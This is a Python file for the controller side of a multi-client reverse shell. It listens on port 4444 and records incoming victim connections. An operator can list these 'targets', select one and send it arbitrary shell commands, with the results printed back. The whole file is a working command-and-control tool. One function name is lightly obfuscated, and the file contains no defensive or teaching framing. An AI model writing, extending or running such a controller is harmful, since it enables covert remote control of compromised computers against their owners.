import socket
import sys
import threading
from queue import Queue


NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []


# Create socket
def socket_create():
    try:
        global host
        global port
        global s

        host = '' # Leave blank for own machine
        port = 4444
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error : " + str(msg))


# Bind socket to port and wait for client
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port : " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error : " + str(msg) + '\n' + "Retrying...")
        socket_bind()


# # Establish connection with client
# def socket_accept():
#     conn, address = s.accept()
#     print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
#     send_commands(conn)
#     conn.close()

# Accept connections from multiple clients and save to list
def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while True:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            print("\n Connection made to " + address[0])
        except:
            print("Error in accepting connections")


# Interactive promt
def start_c03u5():
    while True:
        cmd = input('command> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("\nThe heck you doin' dude.")


# Display all current connections
def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + ' ' + str(all_addresses[i][0]) + '\n'
    print('------------Clients------------' + '\n' + results)


# Select target client
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + '> ', end='')
        return conn
    except:
        print("Not a valid selection.")
        return None


# Connect with remote target client
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end='')
        except:
            print("Connection lost")
            break


# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Create jobs
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


# Do jobs
def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            start_c03u5()
        queue.task_done()


# Sends commands to client
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(20480), "utf-8")
            print(client_response, end='')


def main():
    create_workers()
    create_jobs()

main()

